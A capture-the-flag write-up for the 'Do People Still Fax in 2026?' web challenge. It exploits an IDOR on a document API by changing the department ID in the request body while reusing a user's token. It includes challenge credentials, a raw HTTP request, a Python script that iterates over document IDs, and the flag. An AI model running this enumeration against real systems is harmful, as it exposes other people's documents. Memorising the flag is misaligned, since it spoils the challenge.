---
title: Do People Still Fax in 2026? (3 of 4 series)
tags:
  - DEADFACE CTF 2026
  - Web
---

# Do People Still Fax in 2026? (3 of 4 series)

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Web |
| **Points** | 100 |
| **Author** | @RP-01? |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[chaimae098](https://github.com/chaimae098) · Lyna · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) |

## Challenge

> Websites with documents can expose files. Find a document that does not belong to you.
>
> Target: `http://45.79.200.170:3000/`. Do not port-scan the host; use the address and port discovered through OSINT.

## Solution

### The document API

OSINT gave us the portal login `john.smith` / `Locked_In_And_Ready`. Logging in through `POST /api/login` returns a JWT with `departmentid: 10685`.

The page JavaScript and the Swagger spec show `POST /file_document?id=...`, which takes a `departmentid` in the JSON body. The department lookup endpoint lists two departments: `10685` and `18432`.

### The IDOR

We asked for document `1001` with `{"departmentid":18432}` while still using John's token, and got a PDF back. His token says `10685`, so the server trusts whatever department we put in the body.

After that it was a small loop over IDs `1000`–`1050` with both departments. Document `1020` in department `18432` was the one:

```http
POST /file_document?id=1020 HTTP/1.1
Host: 45.79.200.170:3000
Authorization: Bearer <john.smith JWT>
Content-Type: application/json

{"departmentid":18432}
```

The flag sits in the PDF as plain text, so `strings` finds it. Here's the script we used (standard library only):

```python
import json
import os
import re
from urllib.error import HTTPError
from urllib.request import Request, urlopen

BASE = "http://45.79.200.170:3000"
USERNAME = os.environ["HEALTHSPARK_USER"]
PASSWORD = os.environ["HEALTHSPARK_PASSWORD"]


def post(path, body, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = Request(
        BASE + path,
        data=json.dumps(body).encode(),
        headers=headers,
        method="POST",
    )
    try:
        with urlopen(request, timeout=10) as response:
            return response.status, response.read()
    except HTTPError as error:
        return error.code, error.read()


status, body = post(
    "/api/login",
    {"username": USERNAME, "password": PASSWORD},
)
if status != 200:
    raise SystemExit(f"Login failed: HTTP {status}")
token = json.loads(body)["token"]

for document_id in range(1000, 1051):
    for department_id in (10685, 18432):
        status, pdf = post(
            f"/file_document?id={document_id}",
            {"departmentid": department_id},
            token,
        )
        if status != 200:
            continue
        match = re.search(rb"deadface\{[^}\r\n]+\}", pdf)
        print(f"PDF: id={document_id}, department={department_id}")
        if match:
            print(match.group().decode())
```

Set `HEALTHSPARK_USER` and `HEALTHSPARK_PASSWORD` first. It only talks to the host and port the challenge gives you.

```text
deadface{someone_should_report_this}
```

Don't mix this up with `deadface{typical_and_classic}` from the login SQLi. That one is part 1.

## Flag

!!! flag "Flag"
    `deadface{someone_should_report_this}`

## Takeaways

If an endpoint takes an owner or department ID in the body, change it. Here the server never compared it with the token.
